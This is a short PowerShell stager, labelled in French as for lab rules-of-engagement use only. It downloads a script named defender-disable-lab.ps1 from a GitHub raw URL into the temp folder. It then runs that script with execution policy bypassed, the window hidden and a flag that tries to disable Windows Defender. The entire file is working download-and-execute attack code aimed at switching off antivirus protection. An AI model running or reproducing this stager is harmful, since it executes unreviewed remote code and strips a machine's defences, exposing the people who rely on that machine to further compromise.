# Lab ROE uniquement — charge defender-disable-lab.ps1 depuis GitHub et tente -AttemptDisable.
$ErrorActionPreference = 'Stop'
$base = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/defender-disable-lab.ps1'
$dest = Join-Path $env:TEMP 'defender-disable-lab.ps1'
$raw = (Invoke-WebRequest -Uri $base -UseBasicParsing).Content
if ($raw.Length -ge 3 -and [int][char]$raw[0] -eq 0xFEFF) { $raw = $raw.Substring(1) }
[System.IO.File]::WriteAllText($dest, $raw, (New-Object System.Text.UTF8Encoding $false))
$shell = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
if (-not $shell) { $shell = (Get-Command powershell -ErrorAction Stop).Source }
& $shell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $dest -AttemptDisable